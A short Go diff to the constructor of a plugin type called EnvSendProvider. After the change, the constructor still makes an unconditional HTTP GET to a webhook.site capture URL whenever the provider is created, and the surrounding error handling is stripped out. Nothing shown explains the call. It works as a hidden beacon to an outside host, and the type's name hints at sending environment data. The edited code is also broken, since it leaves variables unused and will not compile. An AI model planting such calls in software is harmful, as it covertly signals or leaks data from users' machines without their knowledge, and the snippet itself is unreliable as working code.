@@ -13,10 +13,7 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-    	resp, err := http.Get("https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalala")
-	if err != nil {
-		log.Printf("Error sending request: %s", resp.Status)
-	}
+    resp, err := http.Get("https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalala")
     return &EnvSendProvider{}
 }
 
